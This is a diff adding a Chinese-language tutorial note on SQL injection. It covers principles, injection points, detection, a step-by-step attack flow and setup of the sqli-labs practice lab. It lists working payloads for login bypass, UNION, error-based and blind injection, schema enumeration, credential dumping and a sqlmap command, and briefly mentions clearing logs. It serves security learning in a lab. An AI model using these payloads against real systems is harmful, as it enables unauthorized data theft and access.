@@ -1,0 +1,197 @@
+### sql注入的基本原理
+SQL 注入（SQL Injection）是指攻击者通过向 Web 应用程序的输入字段注入恶意 SQL 语句，从而操控后台数据库，达到非法获取数据、绕过登录验证、甚至执行数据库操作的目的。
+
+原理本质：
+
++ 后端拼接 SQL 时，**未对用户输入做过滤或参数化处理**，导致恶意输入成为了 SQL 语句的一部分。
+
+##### 举例：用 `or 1=1 --` 绕过登录
+输入：
+
+```plain
+用户名：admin' OR 1=1 -- 
+密码：随便写
+```
+
+拼接后的 SQL：
+
+```plain
+SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'xxx';
+```
+
+`--` 是 SQL 注释符，表示后面的内容被注释掉了。
+
+最终效果：
+
+```plain
+SELECT * FROM users WHERE username = 'admin' OR 1=1;
+```
+
++ 由于 `1=1` 恒为真，返回了所有用户的信息，实现了**登录绕过**。
+
+
+
+### sql注入的注入点
+ 	注入点就是程序**将你的输入直接拼接进 SQL 语句**的位置。  
+
+#### 常见注入点
+| 类型 | 示例 |
+| --- | --- |
+| URL 参数 | `?id=1` |
+| 表单字段 | 登录框、搜索框、注册表单等 |
+| Cookie | 某些站点通过 Cookie 控制用户身份 |
+| HTTP Header | `User-Agent`、`Referer`等头部 |
+| POST 请求体 | 比如 JSON 提交数据的接口 |
+
+
+注：一个完整的 URL（统一资源定位符）
+
+```plain
+协议://域名/路径?查询参数#锚点
+
+?是标志查询字符串的开始，它的后面是键值对形式的参数
+```
+
+#### 如何快速判断是否是注入点
++ **网页异常输出**：比如语法错误、空白页、异常数据
++ **响应时间变化**：用 sleep(5) 观察页面是否延迟
++ **页面数据量突然异常多**：可能 `or 1=1` 生效了
++ **配合工具**：sqlmap、Burp Intruder 可以自动跑
+
+
+
+常见判断是否有注入方法
+
+| 方法 | 原理 | 示例 / 提示 |
+| --- | --- | --- |
+| 💥 **报错回显** | 数据库拼接失败，页面报错 | `'`→ 页面出现 SQL syntax error |
+| 📄 **页面内容变化** | 结果不同说明语句被执行了 | `1 and 1=1`<br/> vs `1 and 1=2` |
+| ⏳ **响应时间延迟** | 用 sleep() 测试时间盲注 | `1' and sleep(5) --` |
+| 🔄 **页面返回逻辑异常** | 条件恒真后结果量激增 | `or 1=1`→ 搜索出全部内容 |
+| 🛠️ **工具辅助探测** | sqlmap 等自动判断执行情况 | sqlmap 会报告注入点成功 |
+
+
+
+
+### sql注入流程
+🔍 找注入点 → ✅ 验证注入是否存在 → 🔎 判断注入类型
+
+→ 📖 信息收集（库、表、字段）→ 🧠 获取数据 → 🧹清痕
+
+#### **1️⃣**** 寻找注入点（发现可能存在 SQL 的位置）**
+常见入口：
+
++ 🔗 URL 参数：`?id=1`
++ 🔍 搜索框：输入关键词后看响应
++ 🔐 登录框：账号密码提交后是否异常
++ 🍪 Cookie、HTTP Header（高级一点）
+
+工具辅助：Burp Suite、F12 抓包、手动访问不同页面
+
+---
+
+#### **2️⃣**** 验证是否存在注入（测试 SQL 是否能被执行）**
+测试 payload 示例：
+
++ `'`（单引号引起 SQL 错误）
++ `' OR '1'='1`
++ `and 1=1` vs `and 1=2`
++ `sleep(3)` 判断是否延迟响应
+
+判断依据：
+
++ 页面报错
++ 页面结构/内容发生明显变化
++ 页面加载变慢（延迟注入）
+
+---
+
+#### **3️⃣**** 判断注入类型（重要！影响后续攻击方式）**
+| 类型 | 示例 | 特点 |
+| --- | --- | --- |
+| 🧾 联合注入（Union） | `' UNION SELECT 1,2 --` | 有回显，结果可见 |
+| 📉 报错注入 | `' AND updatexml(1,concat(0x7e,(SELECT @@version)),1) --` | 利用报错回显数据 |
+| 🕰️ 时间盲注 | `' AND IF(1=1, sleep(3), 0) --` | 页面延迟说明条件为真 |
+| ❓ 布尔盲注 | `' AND 1=1 --`<br/> vs `' AND 1=2 --` | 看页面有无差异 |
+
+
+---
+
+#### **4️⃣**** 信息收集（判断数据库结构）**
+如果是联合注入，有回显的话：
+
++ 判断字段数量（`ORDER BY n`、`UNION SELECT`）
++ 查询数据库名：`SELECT database()`
++ 枚举所有数据库：`SELECT schema_name FROM information_schema.schemata`
++ 枚举表名：`SELECT table_name FROM information_schema.tables WHERE table_schema='目标库'`
++ 枚举字段名：`SELECT column_name FROM information_schema.columns WHERE table_name='目标表'`
+
+---
+
+#### **5️⃣**** 获取敏感数据（账号、密码等）**
+例子：
+
+```plain
+' UNION SELECT 1, username, password FROM users --
+```
+
+或者：
+
+```plain
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
+```
+
+---
+
+#### **6️⃣**** 清除痕迹（安全责任感）**
++ 不要修改数据（除非授权测试）
++ 清空日志（高级，演示环境可做）
++ 不破坏、不传播、不利用（合规测试必须）
+
+---
+
+#### 🔧 工具辅助流程
+如果用工具 sqlmap，这些步骤可以自动完成：
+
+```plain
+sqlmap -u "http://example.com/product.php?id=1" --dbs
+```
+
+依次：
+
++ 自动判断注入点
++ 自动判断注入类型
++ 自动跑库、表、字段、数据
+
+还可以跑 cookie、POST、JSON 等更复杂结构。
+
+### docker搭建sqli-labs
+```plain
+docker search sqli-labs
+docker pull acgpiano/sqli-labs
+docker images
+docker run -it -d --name sqli-labs -p 80:80 -p 13306:3306 acgpiano/sqli-labs
+docker ps
+#访问部署sqlilabs的机器ip
+```
+
+<img src="https://cdn.nlark.com/yuque/0/2025/png/35187477/1744629549058-8f93d850-03a7-4766-9e42-a6cc622bd0fa.png" width="794.6666666666666" title="" crop="0,0,1,1" id="u9382e4db" class="ne-image">
+
+
+
+#### Less-1
+判断是否存在sql注入
+
+<img src="https://cdn.nlark.com/yuque/0/2025/png/35187477/1744630351281-a20185f3-8f26-4c65-9659-7b201829e5ba.png" width="1384.6666666666667" title="" crop="0,0,1,1" id="u1ee3dacd" class="ne-image">
+
+提示输入数字值的ID作为参数，输入?id=1
+
+<img src="https://cdn.nlark.com/yuque/0/2025/png/35187477/1744634517217-e203a47d-7e13-49cb-b0bd-c9365a10cb76.png" width="598.6666666666666" title="" crop="0,0,1,1" id="u759607b9" class="ne-image">
+
+<img src="https://cdn.nlark.com/yuque/0/2025/png/35187477/1744634571681-6bfcbb5e-5544-47e0-847d-c7de07a7ec79.png" width="630" title="" crop="0,0,1,1" id="u2ec0a34c" class="ne-image">
+
+不同的id数值返回结果不同，说明我们输入的内容是带到后端数据库进行查询了
+
+接下来判断sql语句是否进行拼接，是字符型还是数字型，输入字符型 '(%27)
+
+<img src="https://cdn.nlark.com/yuque/0/2025/png/35187477/1744635131338-41083af4-6f5e-4acb-8144-2dc58a0fa2fd.png" width="840.6666666666666" title="" crop="0,0,1,1" id="u3171a395" class="ne-image">
